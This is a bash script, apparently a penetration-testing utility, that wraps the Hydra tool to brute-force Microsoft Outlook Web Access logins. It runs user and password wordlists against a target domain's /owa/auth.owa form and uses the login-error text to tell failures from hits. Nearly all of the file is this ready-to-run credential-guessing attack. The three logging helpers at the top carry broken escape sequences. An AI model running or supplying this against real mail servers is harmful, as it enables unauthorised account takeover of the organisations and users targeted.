#!/usr/bin/env bash

log()  { echo -e "x1b[1m[x1b[93mLOGx1b[0mx1b[1m]x1b[0m ${@}";  }
info() { echo -e "x1b[1m[x1b[92mINFOx1b[0mx1b[1m]x1b[0m ${@}"; }
warn() { echo -e "x1b[1m[x1b[91mWARNx1b[0mx1b[1m]x1b[0m ${@}"; }

HEADER="
 ██████╗ ██╗    ██╗ █████╗     ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
██╔═══██╗██║    ██║██╔══██╗    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
██║   ██║██║ █╗ ██║███████║    ██████╔╝██████╔╝██║   ██║   ██║   █████╗
██║   ██║██║███╗██║██╔══██║    ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝
╚██████╔╝╚███╔███╔╝██║  ██║    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
 ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝

Hydra wrapper for bruteforcing Microsoft OWA.
"

owabrute(){
    if [[ $# -ne 3 ]]; then
        echo "Usage : owabrute DOMAIN USERSLIST PASSLIST"
    else
        if [[ $(which hydra) == "" ]]; then
            echo -e "\x1b[1m[\x1b[91mWARN\x1b[0m\x1b[1m]\x1b[0m hydra not found. Install it with apt install hydra."
        else
            local DOMAIN="${1}"
            local USERSLIST="${2}"
            local PASSLIST="${3}"

            hydra -V            \
                -L "${USERSLIST}"  \
                -e s            \
                -P "${PASSLIST}" \
                "${DOMAIN}"       \
                https-post-form "/owa/auth.owa:flags=4&destination=https\://${DOMAIN}/owa/&forcedownlevel=0&username=^USER^&password=^PASS^&isUtf8=1:F=The user name or password"
        fi
    fi
}


usage(){
    echo "Usage : ./owabruter.sh"
    echo "      -d DOMAIN    : Target domain. Example : remote.targethost.co.uk"
    echo "      -u USERSLIST : Path to wordlist of users to test"
    echo "      -p PASSLIST  : Path to wordlist of passwords to test"
}


#===============================================================================

if [[ $# -lt 2 || $# -gt 6 ]]; then
    usage
else
    DOMAIN=""
    USERSLIST=""
    PASSLIST=""
    while getopts d:u:p:h: option; do
        case "${option}" in
            d) DOMAIN="${OPTARG}";;
            u) USERSLIST="${OPTARG}";;
            p) PASSLIST="${OPTARG}";;
            h) usage;;
        esac
    done

    if [[ "${DOMAIN}" == "" ]] || [[ "${USERSLIST}" == "" ]] || [[ "${PASSLIST}" == "" ]]; then
        usage
    else
        echo "${HEADER}"

        echo -e "DOMAIN    : \x1b[1;92m${DOMAIN}\x1b[0m"
        if [[ -f "${USERSLIST}" ]]; then
            echo -e "USERSLIST : \x1b[1;92m${USERSLIST}\x1b[0m"
        else
            echo -e "USERSLIST : \x1b[1;91m${USERSLIST}\x1b[0m (Could not access ressource)"
        fi

        if [[ -f "${PASSLIST}" ]]; then
            echo -e "PASSLIST  : \x1b[1;92m${PASSLIST}\x1b[0m"
        else
            echo -e "PASSLIST  : \x1b[1;91m${PASSLIST}\x1b[0m (Could not access ressource)"
        fi
        echo ""
        if [ ! -f "${USERSLIST}" ] || [ ! -f "${PASSLIST}" ]; then
            echo -e "\x1b[1m[\x1b[91mWARN\x1b[0m\x1b[1m]\x1b[0m Some resources could not be accessed. Aborting..."
        else
            owabrute "${DOMAIN}" "${USERSLIST}" "${PASSLIST}"
        fi
    fi
fi
